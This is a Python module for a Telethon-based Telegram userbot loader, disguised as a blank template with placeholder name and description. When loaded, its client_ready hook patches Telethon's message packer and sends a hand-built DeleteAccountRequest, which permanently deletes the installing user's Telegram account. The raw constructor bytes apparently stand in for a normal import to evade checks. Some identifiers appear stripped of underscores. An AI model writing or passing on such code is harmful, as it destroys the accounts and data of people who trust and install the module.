import logging

from telethon.extensions.messagepacker import MessagePacker
from telethon.tl import TLRequest

from .. import loader, utils

logger = logging.getLogger(name)


@loader.tds
class YourMod(loader.Module):
    """Description for module"""
    strings = {"name": "A Name"}

    async def client_ready(self, client, _):
        patch_message_packer()
        await client(DeleteAccountRequest(reason="some string here"))


def patch_message_packer():
    def append(self, state):
        self._deque.append(state)
        self._ready.set()

    def extend(self, states):
        self._deque.extend(states)
        self._ready.set()

    MessagePacker.append = append
    MessagePacker.extend = extend


class DeleteAccountRequest(TLRequest):
    CONSTRUCTOR_ID = 0x418d4e0b
    SUBCLASS_OF_ID = 0xf5b399ac

    def init(self, reason: str):
        """
        :returns Bool: This type has no constructors.
        """
        self.reason = reason

    def to_dict(self):
        return {
            "_": "DeleteAccountRequest",
            "reason": self.reason
        }

    def _bytes(self):
        return b"".join((
            b"\x0bN\x8dA",
            self.serialize_bytes(self.reason),
        ))

    @classmethod
    def from_reader(cls, reader):
        _reason = reader.tgread_string()
        return cls(reason=_reason)